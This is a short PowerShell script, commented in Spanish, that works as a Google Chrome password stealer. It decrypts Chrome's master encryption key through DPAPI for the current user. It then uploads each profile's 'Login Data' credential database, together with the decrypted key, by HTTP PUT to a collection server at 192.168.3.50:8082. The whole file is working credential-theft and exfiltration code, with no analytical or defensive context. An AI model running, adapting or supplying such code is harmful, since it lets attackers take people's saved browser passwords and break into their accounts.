$cont = "$env:TEMP/data_msg.txt" 
$server = "http://192.168.3.50:8082/"


# _______________ Extraccion de credenciales
 

# LOCAL STATE ( archivo que contiene la clave de cifrado

# Cargar el archivo Local State y obtener la clave cifrada
$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json

# Obtener la clave cifrada
$encryptedKey = [System.Convert]::FromBase64String($localStateContent.os_crypt.encrypted_key)

# Eliminar los primeros 5 bytes (prefijo 'DPAPI')
$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]


# agregar paquete necesario para el descifrado
Add-Type -Path "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.dll"

# Desencriptar la clave usando DPAPI (esto usa la clave de usuario actual en el sistema)
$dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)


# Convertir la clave binaria a base64
$base64Key = [Convert]::ToBase64String($dpapiKey) 
echo "PASSWORD: $base64Key" >> $cont


#Extraer y enviar LOGIN DATA (BASE DE DATOS con credenciales SQLITE)
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\"

$profiles = Get-ChildItem $path | Where-Object { $_.Name -like "Profile*"} | Select-Object "Name"
if ($profiles) {
    foreach ($profile in $profiles) {
        $file_name = $profile.Name -replace " ", ""
        $file_logins = "$env:LOCALAPPDATA\Google\Chrome\User Data\$($profile.Name)\login data"
        Invoke-WebRequest -Uri "$server/upload_file/login_data_$env:USERNAME_$file_name" -Method PUT -InFile $file_logins -ContentType "application/octet-stream"
    }
}
else {
    $file_logins = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\login data"
    Invoke-WebRequest -Uri "$server/upload_file/login_data_$env:USERNAME_default" -Method PUT -InFile $file_logins -ContentType "application/octet-stream"
}

# Envio de clave de cifrado
Invoke-RestMethod -Uri "$server/receive_text" -Method PUT -Body (Get-Content $cont -Raw) -ContentType "text/plain"




